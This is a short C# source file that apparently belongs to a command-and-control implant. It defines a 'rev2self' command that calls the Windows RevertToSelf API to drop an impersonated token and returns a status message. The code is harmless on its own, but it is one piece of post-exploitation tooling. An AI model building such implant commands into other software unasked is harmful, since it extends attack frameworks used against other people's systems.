using Native = SharedArsenal.Native;
using Knight.Models.Raven;

namespace Knight.Commands
{
    public class RevToSelf : KnightCommand
    {
        public override string Name => "rev2self";

        public override string Execute(TaskMessage task)
        {
            if (Native.Advapi.RevertToSelf())
            {
                // Could return windows identity here again
                return "Revered to self";
            }

            return "Failed to revert";
        }
    }
}